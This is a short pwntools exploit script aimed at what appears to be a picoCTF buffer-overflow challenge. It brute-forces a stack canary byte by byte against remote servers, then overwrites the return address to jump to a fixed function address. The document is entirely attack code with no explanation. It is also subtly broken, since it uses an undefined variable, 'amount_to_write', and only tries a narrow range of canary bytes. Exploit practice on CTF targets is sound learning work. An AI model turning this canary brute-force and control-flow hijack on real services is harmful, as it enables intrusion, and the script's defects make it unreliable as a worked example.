from pwn import *
import struct
import time

def bytes2str(input):
	return str(input,"utf-8")

elf = ELF("./vuln",checksec=False)
#p = elf.process()
#p = remote("167.71.138.246", 31172)


#gdb.attach(p,'''
#	b *0x08049587
#	continue
#	''')

success_msg = "Ok... Now Where's the Flag?"
#payload = b'a'*64 + b'BiRd'
payload = b'a'*64

#while(len(canary) != 4):

for j in range(4):
	for char in range(65,122):
		byte = struct.pack("B",char)
		#print(byte)	

		#p = elf.process()
		p = remote("saturn.picoctf.net", 64197)
		p.recvuntil(b"> ")
		p.sendline(bytes(str(amount_to_write) , "utf-8"))

		p.recvuntil(b"Input> ")
		p.sendline(payload + byte)

		output = bytes2str(p.recvall()).strip()
		#output = p.recvall().decode("utf-8")
		#print(output)

		if success_msg in output:
			print(f"Canary byte success = {byte}")
			payload += struct.pack("B",char)
			break

print(f"Final payload = {payload}")

p = remote("saturn.picoctf.net", 51220)

p.recvuntil(b"> ")
p.sendline(b"1000")
p.recvuntil(b"Input> ")
p.sendline(payload + p32(0x41414141)*4 + p32(0x08049336))

print(p.recvall())

